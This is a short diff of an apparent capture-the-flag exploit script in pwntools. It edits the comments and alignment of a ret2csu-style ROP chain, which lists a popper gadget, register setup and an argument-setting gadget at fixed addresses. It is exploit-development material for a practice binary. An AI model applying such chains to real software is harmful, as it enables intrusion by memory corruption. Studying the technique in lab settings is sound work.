@@ -23,12 +23,12 @@ payload = flat(
     { offset : 0x000000000040069a }, # popper gadget
     0,                  # rbx
     1,                  # rbp
-    _fini,  # r12
-    rdi,                # r13(d) -> edi
+    _fini,              # r12
+    rdi,                # r13(d) -> edi (useless)
     rsi,                # r14 -> rdi
     rdx,                # r15 -> rdx
 
-    0x0000000000400680, # caller gadget
+    0x0000000000400680, # set arguments gadget
     0,                  # garbage (add rsp, 0x8)
     0,                  # rbx
     0,                  # rbp
